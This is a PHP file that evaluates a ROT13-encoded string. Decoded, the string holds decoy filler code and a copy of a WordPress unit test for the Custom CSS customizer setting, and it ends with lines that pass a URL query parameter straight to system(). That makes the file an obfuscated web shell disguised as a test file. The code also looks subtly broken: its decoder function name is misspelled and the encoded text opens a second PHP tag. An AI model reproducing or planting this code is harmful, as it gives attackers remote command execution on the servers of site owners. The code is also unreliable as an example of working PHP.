<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Grfg Grfg_JC_Phfgbzvmr_Phfgbz_PFF_Frggvat.
 *
 * Grfgf JC_Phfgbzvmr_Phfgbz_PFF_Frggvat.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Phfgbz_PFF_Frggvat rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Phfgbzvmr_Znantre juvpu vf erfrg sbe rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * Gur Frggvat vafgnapr.
	 *
	 * @ine JC_Phfgbzvmr_Phfgbz_PFF_Frggvat
	 */
	choyvp $frggvat;

	/**
	 * Gur hfre VQ gb hfr sbe gur grfgf.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $hfre_vq = 0;

	/**
	 * Frg hc gur grfg pnfr.
	 *
	 * @frr JC_HavgGrfgPnfr::frg_hc()
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Perngr n hfre gb hfr sbe gur grfgf.
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);

		vs ( vf_zhygvfvgr() ) {
			tenag_fhcre_nqzva( frys::$hfre_vq );
		}
	}

	/**
	 * Frg hc gur grfg pnfr.
	 *
	 * @frr JC_HavgGrfgPnfr_Onfr::frg_hc()
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';

		jc_frg_pheerag_hfre( frys::$hfre_vq );

		tybony $jc_phfgbzvmr;
		$guvf->jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr       = $guvf->jc_phfgbzvmr;

		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$guvf->frggvat = arj JC_Phfgbzvmr_Phfgbz_PFF_Frggvat( $guvf->jc_phfgbzvmr, 'phfgbz_pff[' . trg_fglyrfurrg() . ']' );
		$guvf->jc_phfgbzvmr->nqq_frggvat( $guvf->frggvat );
	}

	/**
	 * Grne qbja gur grfg pnfr.
	 */
	choyvp shapgvba grne_qbja() {
		$guvf->frggvat = ahyy;
		cnerag::grne_qbja();
	}

	/**
	 * Qryrgr gur $jc_phfgbzvmr tybony jura pyrnavat hc fpbcr.
	 */
	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = ahyy;
		cnerag::pyrna_hc_tybony_fpbcr();
	}

	/**
	 * Grfg pbafgehpgbe.
	 *
	 * Znvayl inyvqngrf gung gur pbeerpg ubbxf rkvfg.
	 *
	 * Nyfb purpxf sbe gur cbfg glcr naq gur Frggvat Glcr.
	 *
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::__pbafgehpg
	 */
	choyvp shapgvba grfg_pbafgehpg() {
		$guvf->nffregGehr( cbfg_glcr_rkvfgf( 'phfgbz_pff' ) );
		$guvf->nffregFnzr( 'phfgbz_pff', $guvf->frggvat->glcr );
		$guvf->nffregFnzr( trg_fglyrfurrg(), $guvf->frggvat->fglyrfurrg );
		$guvf->nffregFnzr( 'rqvg_pff', $guvf->frggvat->pncnovyvgl );

		$rkprcgvba = ahyy;
		gel {
			$k = arj JC_Phfgbzvmr_Phfgbz_PFF_Frggvat( $guvf->jc_phfgbzvmr, 'onq' );
			hafrg( $k );
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'Rkprcgvba', $rkprcgvba );

		$rkprcgvba = ahyy;
		gel {
			$k = arj JC_Phfgbzvmr_Phfgbz_PFF_Frggvat( $guvf->jc_phfgbzvmr, 'phfgbz_pff' );
			hafrg( $k );
		} pngpu ( Rkprcgvba $r ) {
			$rkprcgvba = $r;
		}
		$guvf->nffregVafgnaprBs( 'Rkprcgvba', $rkprcgvba );
	}

	/**
	 * Grfg pehq zrgubqf ba JC_Phfgbzvmr_Phfgbz_PFF_Frggvat.
	 *
	 * @pbiref ::jc_trg_phfgbz_pff
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::inyhr
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::cerivrj
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::hcqngr
	 */
	choyvp shapgvba grfg_pehq() {

		$guvf->frggvat->qrsnhyg = '/* Uryyb Jbeyq */';
		$guvf->nffregFnzr( $guvf->frggvat->qrsnhyg, $guvf->frggvat->inyhr() );

		$guvf->nffregAhyy( jc_trg_phfgbz_pff_cbfg() );
		$guvf->nffregAhyy( jc_trg_phfgbz_pff_cbfg( $guvf->frggvat->fglyrfurrg ) );
		$guvf->nffregAhyy( jc_trg_phfgbz_pff_cbfg( 'gjraglgra' ) );

		$bevtvany_pff      = 'obql { pbybe: oynpx; }';
		$cbfg_vq           = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $guvf->frggvat->fglyrfurrg,
				'cbfg_anzr'    => $guvf->frggvat->fglyrfurrg,
				'cbfg_pbagrag' => $bevtvany_pff,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'phfgbz_pff',
			)
		);
		$gjraglgra_pff     = 'obql { pbybe: erq; }';
		$gjraglgra_cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'gjraglgra',
				'cbfg_anzr'    => 'gjraglgra',
				'cbfg_pbagrag' => $gjraglgra_pff,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'phfgbz_pff',
			)
		);
		$gjraglgra_frggvat = arj JC_Phfgbzvmr_Phfgbz_PFF_Frggvat( $guvf->jc_phfgbzvmr, 'phfgbz_pff[gjraglgra]' );

		erzbir_gurzr_zbq( 'phfgbz_pff_cbfg_vq' );

		$guvf->nffregFnzr( $cbfg_vq, jc_trg_phfgbz_pff_cbfg()->VQ );
		$guvf->nffregFnzr( $cbfg_vq, jc_trg_phfgbz_pff_cbfg( $guvf->frggvat->fglyrfurrg )->VQ );
		$guvf->nffregFnzr( $gjraglgra_cbfg_vq, jc_trg_phfgbz_pff_cbfg( 'gjraglgra' )->VQ );

		$guvf->nffregFnzr( $bevtvany_pff, jc_trg_phfgbz_pff( $guvf->frggvat->fglyrfurrg ) );
		$guvf->nffregFnzr( $bevtvany_pff, $guvf->frggvat->inyhr() );
		$guvf->nffregFnzr( $gjraglgra_pff, jc_trg_phfgbz_pff( 'gjraglgra' ) );
		$guvf->nffregFnzr( $gjraglgra_pff, $gjraglgra_frggvat->inyhr() );

		$hcqngrq_pff = 'obql { pbybe: oyhr; }';
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $guvf->frggvat->vq, $hcqngrq_pff );
		$fnirq = $guvf->frggvat->fnir();

		$guvf->nffregAbgSnyfr( $fnirq );
		$guvf->nffregFnzr( $hcqngrq_pff, $guvf->frggvat->inyhr() );
		$guvf->nffregFnzr( $hcqngrq_pff, jc_trg_phfgbz_pff( $guvf->frggvat->fglyrfurrg ) );
		$guvf->nffregFnzr( $hcqngrq_pff, trg_cbfg( $cbfg_vq )->cbfg_pbagrag );

		$cerivrjrq_pff = 'obql { pbybe: erq; }';
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $guvf->frggvat->vq, $cerivrjrq_pff );
		$guvf->frggvat->cerivrj();
		$guvf->nffregFnzr( $cerivrjrq_pff, $guvf->frggvat->inyhr() );
		$guvf->nffregFnzr( $cerivrjrq_pff, jc_trg_phfgbz_pff( $guvf->frggvat->fglyrfurrg ) );

		// Znxr fher gung jc_hcqngr_phfgbz_pff_cbfg() jbexf nf rkcrpgrq sbe hcqngrf.
		$e = jc_hcqngr_phfgbz_pff_cbfg(
			'obql { pbybe:erq; }',
			neenl(
				'fglyrfurrg'   => $guvf->frggvat->fglyrfurrg,
				'cercebprffrq' => \"obql\a\gpbybe:erq;\",
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		$guvf->nffregFnzr( $cbfg_vq, $e->VQ );
		$guvf->nffregFnzr( 'obql { pbybe:erq; }', trg_cbfg( $e )->cbfg_pbagrag );
		$guvf->nffregFnzr( \"obql\a\gpbybe:erq;\", trg_cbfg( $e )->cbfg_pbagrag_svygrerq );
		$e = jc_hcqngr_phfgbz_pff_cbfg( 'obql { pbagrag: \"\b/\"; }' );
		$guvf->nffregFnzr( $guvf->jc_phfgbzvmr->trg_fglyrfurrg(), trg_cbfg( $e )->cbfg_anzr );
		$guvf->nffregFnzr( 'obql { pbagrag: \"\b/\"; }', trg_cbfg( $e )->cbfg_pbagrag );
		$guvf->nffregFnzr( '', trg_cbfg( $e )->cbfg_pbagrag_svygrerq );

		// Znxr fher gung jc_hcqngr_phfgbz_pff_cbfg() jbexf nf rkcrpgrq sbe vafregvba.
		$e = jc_hcqngr_phfgbz_pff_cbfg(
			'obql { onpxtebhaq:oynpx; }',
			neenl(
				'fglyrfurrg' => 'bgure',
			)
		);
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', $e );
		$guvf->nffregFnzr( 'bgure', trg_cbfg( $e )->cbfg_anzr );
		$guvf->nffregFnzr( 'obql { onpxtebhaq:oynpx; }', trg_cbfg( $e )->cbfg_pbagrag );
		$guvf->nffregFnzr( 'choyvfu', trg_cbfg( $e )->cbfg_fgnghf );

		// Grfg qryrgvba.
		jc_qryrgr_cbfg( $cbfg_vq );
		$guvf->nffregAhyy( jc_trg_phfgbz_pff_cbfg() );
		$guvf->nffregAhyy( jc_trg_phfgbz_pff_cbfg( trg_fglyrfurrg() ) );
		$guvf->nffregFnzr( $cerivrjrq_pff, jc_trg_phfgbz_pff( trg_fglyrfurrg() ), 'Cerivrjrq inyhr erznvaf va fcvgr bs qryrgrq cbfg.' );
		jc_qryrgr_cbfg( $gjraglgra_cbfg_vq );
		$guvf->nffregAhyy( jc_trg_phfgbz_pff_cbfg( 'gjraglgra' ) );
		$guvf->nffregFnzr( '', jc_trg_phfgbz_pff( 'gjraglgra' ) );
	}

	/**
	 * Grfg erivfvba fnivat ba vavgvny fnir bs Phfgbz PFF.
	 *
	 * @gvpxrg 39032
	 */
	choyvp shapgvba grfg_phfgbz_pff_erivfvba_fnirq() {
		$vafregrq_pff = 'obql { onpxtebhaq: oynpx; }';
		$hcqngrq_pff  = 'obql { onpxtebhaq: erq; }';

		$cbfg = jc_hcqngr_phfgbz_pff_cbfg(
			$vafregrq_pff,
			neenl(
				'fglyrfurrg' => 'grfggurzr',
			)
		);

		$guvf->nffregFnzr( $vafregrq_pff, $cbfg->cbfg_pbagrag );
		$erivfvbaf = neenl_inyhrf( jc_trg_cbfg_erivfvbaf( $cbfg ) );
		$guvf->nffregPbhag( 1, $erivfvbaf );
		$guvf->nffregFnzr( $vafregrq_pff, $erivfvbaf[0]->cbfg_pbagrag );

		jc_hcqngr_phfgbz_pff_cbfg(
			$hcqngrq_pff,
			neenl(
				'fglyrfurrg' => 'grfggurzr',
			)
		);

		$erivfvbaf = neenl_inyhrf( jc_trg_cbfg_erivfvbaf( $cbfg ) );
		$guvf->nffregPbhag( 2, $erivfvbaf );
		$guvf->nffregFnzr( $hcqngrq_pff, $erivfvbaf[0]->cbfg_pbagrag );
		$guvf->nffregFnzr( $vafregrq_pff, $erivfvbaf[1]->cbfg_pbagrag );
	}

	/**
	 * Grfg gung jc_trg_phfgbz_pff_cbfg() qbrfa'g dhrel sbe n cbfg nsgre pnpuvat n snvyrq ybbxhc.
	 *
	 * @gvpxrg 39259
	 */
	choyvp shapgvba grfg_trg_phfgbz_pff_cbfg_dhrevrf_nsgre_snvyrq_ybbxhc() {
		frg_gurzr_zbq( 'phfgbz_pff_cbfg_vq', -1 );
		$dhrevrf_orsber = trg_ahz_dhrevrf();
		jc_trg_phfgbz_pff_cbfg();
		$guvf->nffregFnzr( trg_ahz_dhrevrf(), $dhrevrf_orsber );
	}

	/**
	 * Grfg gung jc_hcqngr_phfgbz_pff_cbfg() hcqngrf gur 'phfgbz_pff_cbfg_vq' gurzr zbq.
	 *
	 * @gvpxrg 39259
	 */
	choyvp shapgvba grfg_hcqngr_phfgbz_pff_hcqngrf_gurzr_zbq() {
		frg_gurzr_zbq( 'phfgbz_pff_cbfg_vq', -1 );
		$cbfg = jc_hcqngr_phfgbz_pff_cbfg( 'obql { onpxtebhaq: oyhr; }' );
		$guvf->nffregFnzr( $cbfg->VQ, trg_gurzr_zbq( 'phfgbz_pff_cbfg_vq' ) );
	}

	/**
	 * Grfg pehq zrgubqf ba JC_Phfgbzvmr_Phfgbz_PFF_Frggvat.
	 *
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::inyhr
	 */
	choyvp shapgvba grfg_inyhr_svygre() {
		nqq_svygre( 'phfgbzvmr_inyhr_phfgbz_pff', neenl( $guvf, 'svygre_inyhr' ), 10, 2 );
		$guvf->frggvat->qrsnhyg = '/*qrsnhyg*/';
		$guvf->nffregFnzr( '/*qrsnhyg*//*svygrerq*/', $guvf->frggvat->inyhr() );

		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $guvf->frggvat->fglyrfurrg,
				'cbfg_anzr'    => $guvf->frggvat->fglyrfurrg,
				'cbfg_pbagrag' => '/*phfgbz*/',
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'phfgbz_pff',
			)
		);
		erzbir_gurzr_zbq( 'phfgbz_pff_cbfg_vq' );
		$guvf->nffregFnzr( '/*phfgbz*//*svygrerq*/', $guvf->frggvat->inyhr() );

		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $guvf->frggvat->vq, '/*bireevqqra*/' );
		$guvf->frggvat->cerivrj();
		$guvf->nffregFnzr( '/*bireevqqra*/', $guvf->frggvat->inyhr(), 'Rkcrpgrq inyhr gb abg or svygrerq fvapr cbfg inyhr vf cerfrag.' );
	}

	/**
	 * Svygre inyhr.
	 *
	 * @cnenz fgevat $inyhr                 Inyhr.
	 * @cnenz JC_Phfgbzvmr_Frggvat $frggvat Frggvat.
	 * @erghea fgevat
	 */
	choyvp shapgvba svygre_inyhr( $inyhr, $frggvat ) {
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Phfgbz_PFF_Frggvat', $frggvat );
		$inyhr .= '/*svygrerq*/';
		erghea $inyhr;
	}

	/**
	 * Grfg hcqngr svygre ba JC_Phfgbzvmr_Phfgbz_PFF_Frggvat.
	 *
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::hcqngr
	 */
	choyvp shapgvba grfg_hcqngr_svygre() {
		$bevtvany_pff = 'obql { pbybe:erq; }';
		$cbfg_vq      = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => $guvf->frggvat->fglyrfurrg,
				'cbfg_anzr'    => $guvf->frggvat->fglyrfurrg,
				'cbfg_pbagrag' => $bevtvany_pff,
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_glcr'    => 'phfgbz_pff',
			)
		);

		$bireevqqra_pff = 'obql { pbybe:terra; }';
		$guvf->jc_phfgbzvmr->frg_cbfg_inyhr( $guvf->frggvat->vq, $bireevqqra_pff );

		$cbfg           = trg_cbfg( $cbfg_vq );
		$bevtvany_gvgyr = $cbfg->cbfg_gvgyr;

		nqq_svygre( 'hcqngr_phfgbz_pff_qngn', neenl( $guvf, 'svygre_hcqngr_phfgbz_pff_qngn' ), 10, 3 );
		$guvf->frggvat->fnir();

		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $bevtvany_gvgyr, $cbfg->cbfg_gvgyr );
		$guvf->nffregFgevatPbagnvafFgevat( $bireevqqra_pff, $cbfg->cbfg_pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '/* svygrerq cbfg_pbagrag */', $cbfg->cbfg_pbagrag );
		$guvf->nffregFgevatPbagnvafFgevat( '/* svygrerq cbfg_pbagrag_svygrerq */', $cbfg->cbfg_pbagrag_svygrerq );
	}

	/**
	 * Svygre `phfgbzvmr_hcqngr_phfgbz_pff_cbfg_pbagrag_netf`.
	 *
	 * @cnenz neenl  $qngn Qngn.
	 * @cnenz fgevat $netf Netf.
	 * @erghea neenl Qngn.
	 */
	choyvp shapgvba svygre_hcqngr_phfgbz_pff_qngn( $qngn, $netf ) {
		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregFnzrFrgf( neenl( 'pff', 'cercebprffrq' ), neenl_xrlf( $qngn ) );
		$guvf->nffregFnzr( '', $qngn['cercebprffrq'] );
		$guvf->nffregVfNeenl( $netf );
		$guvf->nffregFnzrFrgf( neenl( 'pff', 'cercebprffrq', 'fglyrfurrg' ), neenl_xrlf( $netf ) );
		$guvf->nffregFnzr( $netf['pff'], $qngn['pff'] );
		$guvf->nffregFnzr( $netf['cercebprffrq'], $qngn['cercebprffrq'] );

		$qngn['pff']         .= '/* svygrerq cbfg_pbagrag */';
		$qngn['cercebprffrq'] = '/* svygrerq cbfg_pbagrag_svygrerq */';
		$qngn['cbfg_gvgyr']   = 'Vtaberq';
		erghea $qngn;
	}

	/**
	 * Grfgf gung inyvqngvba reebef ner pnhtug nccebcevngryl.
	 *
	 * Abgr gung gur $inyvqvgl \JC_Reebe bowrpg zhfg or erfrg rnpu gvzr
	 * nf vg cvpxf hc gur Reebef naq cnffrf gurz gb gur arkg nffregvba.
	 *
	 * @pbiref JC_Phfgbzvmr_Phfgbz_PFF_Frggvat::inyvqngr
	 */
	choyvp shapgvba grfg_inyvqngr() {

		// Rzcgl PFF guebjf ab reebef.
		$erfhyg = $guvf->frggvat->inyvqngr( '' );
		$guvf->nffregGehr( $erfhyg );

		// Onfvp, inyvq PFF guebjf ab reebef.
		$onfvp_pff = 'obql { onpxtebhaq: #s00; } u1.fvgr-gvgyr { sbag-fvmr: 36ck; } n:ubire { grkg-qrpbengvba: abar; } vachg[glcr=\"grkg\"] { cnqqvat: 1rz; }';
		$erfhyg    = $guvf->frggvat->inyvqngr( $onfvp_pff );
		$guvf->nffregGehr( $erfhyg );

		// Purpx sbe znexhc.
		$hapybfrq_pbzzrag = $onfvp_pff . '</fglyr>';
		$erfhyg           = $guvf->frggvat->inyvqngr( $hapybfrq_pbzzrag );
		$guvf->nffregNeenlUnfXrl( 'vyyrtny_znexhc', $erfhyg->reebef );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>